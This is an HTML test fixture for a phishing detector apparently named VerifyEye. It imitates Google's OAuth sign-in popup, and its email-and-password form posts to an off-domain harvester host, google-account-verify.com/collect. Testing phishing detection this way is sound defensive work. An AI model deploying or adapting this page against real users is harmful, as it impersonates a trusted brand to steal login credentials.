<!doctype html>
<!-- LOCAL TEST FIXTURE ONLY — never deployed. Fake Google OAuth sign-in popup.
     This is the window a phishing page opens when the victim clicks "Continue
     with Google" — it looks like Google's real OAuth popup but the form posts
     off-domain to the harvester. It impersonates Google on a non-google.com host,
     so VerifyEye should freeze it the moment it opens. -->
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sign in - Google Accounts</title>
  <style>
    :root { --g-blue: #1a73e8; --g-border: #dadce0; --g-text: #202124; --g-sub: #5f6368; }
    * { box-sizing: border-box; }
    body { margin: 0; font-family: "Google Sans", Roboto, Arial, sans-serif; color: var(--g-text); background: #fff; display: grid; place-items: center; min-height: 100vh; }
    .card { width: 100%; max-width: 420px; padding: 48px 40px 36px; text-align: center; }
    .logo { width: 75px; margin: 0 auto 16px; display: block; }
    h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px; }
    .to { font-size: 16px; margin: 0 0 28px; }
    .field { position: relative; margin: 0 0 24px; text-align: left; }
    .field input { width: 100%; height: 56px; padding: 0 15px; font-size: 16px; border: 1px solid var(--g-border); border-radius: 4px; outline: none; }
    .field input:focus { border: 2px solid var(--g-blue); padding: 0 14px; }
    .field label { position: absolute; top: 18px; left: 14px; padding: 0 5px; background: #fff; color: var(--g-sub); font-size: 16px; pointer-events: none; }
    .guest { font-size: 14px; color: var(--g-sub); text-align: left; line-height: 1.5; margin: -8px 0 28px; }
    .guest a { color: var(--g-blue); text-decoration: none; font-weight: 500; }
    .row { display: flex; align-items: center; justify-content: space-between; }
    .create { color: var(--g-blue); font-weight: 500; font-size: 14px; text-decoration: none; }
    .next { background: var(--g-blue); color: #fff; border: 0; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
  </style>
</head>
<body>
  <div class="card">
    <svg class="logo" viewBox="0 0 48 48" aria-hidden="true"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.6l6.8-6.8C35.6 2.4 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.9 6.1C12.4 13.2 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.1 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.5c-.5 2.9-2.2 5.3-4.7 7l7.2 5.6c4.2-3.9 6.6-9.6 6.6-16.1z"/><path fill="#FBBC05" d="M10.5 28.7c-.5-1.5-.8-3-.8-4.7s.3-3.2.8-4.7l-7.9-6.1C1 16.3 0 20 0 24s1 7.7 2.6 10.8l7.9-6.1z"/><path fill="#34A853" d="M24 48c6.2 0 11.5-2 15.3-5.5l-7.2-5.6c-2 1.4-4.6 2.2-8.1 2.2-6.3 0-11.6-3.7-13.5-9.1l-7.9 6.1C6.5 42.6 14.6 48 24 48z"/></svg>
    <h1>Sign in</h1>
    <p class="to">to continue to the app</p>

    <!-- off-domain action is the phishing signal VerifyEye reads -->
    <form action="https://google-account-verify.com/collect" method="post">
      <div class="field">
        <input id="email" name="email" type="email" autocomplete="username" placeholder="Email or phone" required />
      </div>
      <div class="field">
        <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Enter your password" required />
      </div>
      <p class="guest">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
      <div class="row">
        <a class="create" href="#">Create account</a>
        <button class="next" type="submit">Next</button>
      </div>
    </form>
  </div>
</body>
</html>
